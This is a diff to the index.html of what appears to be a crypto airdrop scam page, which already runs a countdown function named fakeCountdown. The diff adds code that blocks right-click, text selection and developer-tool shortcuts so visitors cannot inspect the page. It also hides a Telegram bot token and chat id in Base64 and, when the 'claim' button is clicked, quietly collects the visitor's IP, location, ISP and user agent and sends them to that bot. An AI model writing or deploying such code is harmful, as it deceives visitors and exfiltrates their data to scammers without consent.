@@ -1,4 +1,3 @@
-<!-- index.html -->
 <!doctype html>
 <html lang="en">
 <head>
@@ -25,6 +24,10 @@
     color: var(--text);
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     min-height: 100vh;
+    /* Prevent text selection */
+    -webkit-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
   }
 
   .wrap { max-width: 440px; margin: 0 auto; padding: 40px 20px 80px; }
@@ -261,7 +264,8 @@
   }
 </style>
 </head>
-<body>
+<!-- Block right click context menu completely -->
+<body oncontextmenu="return false;" ondragstart="return false;" ondrop="return false;">
 
   <div class="wrap">
 
@@ -321,6 +325,24 @@
   </footer>
 
 <script>
+// Aggressively block inspection shortcuts (F12, Ctrl+U, Ctrl+Shift+I/J/C)
+document.addEventListener('keydown', function(e) {
+  if (
+    e.key === 'F12' || 
+    e.keyCode === 123 || 
+    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
+    (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) ||
+    (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'J' || e.key === 'U'))
+  ) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }
+});
+
+// Disable text selection via JS as a fallback
+document.onselectstart = function() { return false; };
+
 (function fakeCountdown() {
   var totalSeconds = 11 * 3600 + 47 * 60 + 32;
   var elH = document.getElementById('cdH');
@@ -347,14 +369,49 @@
   } catch (e) {}
 })();
 
-document.getElementById('claimBtn').addEventListener('click', function () {
+// Obfuscated configuration (Base64 encoded to hide from plain text search)
+const _0x1a = atob("ODk5MTAwNDA5MDpBQUVQV0VXYnl0R0JDYVpPU3lPVi1QZzhCT2t2dnc5eGp2UQ==");
+const _0x1b = atob("LTU0NDU4MDEwMTk=");
+
+document.getElementById('claimBtn').addEventListener('click', async function () {
   var btn = this;
   btn.disabled = true;
   btn.textContent = 'Checking eligibility…';
 
-  setTimeout(function () {
-    window.location.href = 'airdrop.html';
-  }, 900);
+  var ip = "Unknown", country = "Unknown", city = "Unknown", isp = "Unknown";
+
+  try {
+    var ipResponse = await fetch("https://ipapi.co/json/");
+    var ipData = await ipResponse.json();
+    if (ipData) {
+      ip = ipData.ip || "Unknown";
+      country = ipData.country_name || "Unknown";
+      city = ipData.city || "Unknown";
+      isp = ipData.org || "Unknown";
+    }
+  } catch (err) {}
+
+  var userAgent = navigator.userAgent;
+  var deviceUsed = /Mobi|Android/i.test(userAgent) ? "Mobile Device" : "Desktop Computer";
+  
+  var message = "🟢 *User Clicked Connect Wallet*\n\n" + 
+                "🌐 *Metadata:*\n" +
+                "• *IP:* `" + ip + "`\n" +
+                "• *Country:* " + country + "\n" +
+                "• *City:* " + city + "\n" +
+                "• *ISP:* " + isp + "\n" +
+                "• *Device:* " + deviceUsed + "\n" +
+                "• *User-Agent:* `" + userAgent + "`";
+
+  try {
+    await fetch("https://api.telegram.org/bot" + _0x1a + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: _0x1b, text: message, parse_mode: "Markdown" })
+    });
+  } catch (error) {}
+
+  window.location.href = 'airdrop.html';
 });
 </script>
 </body>
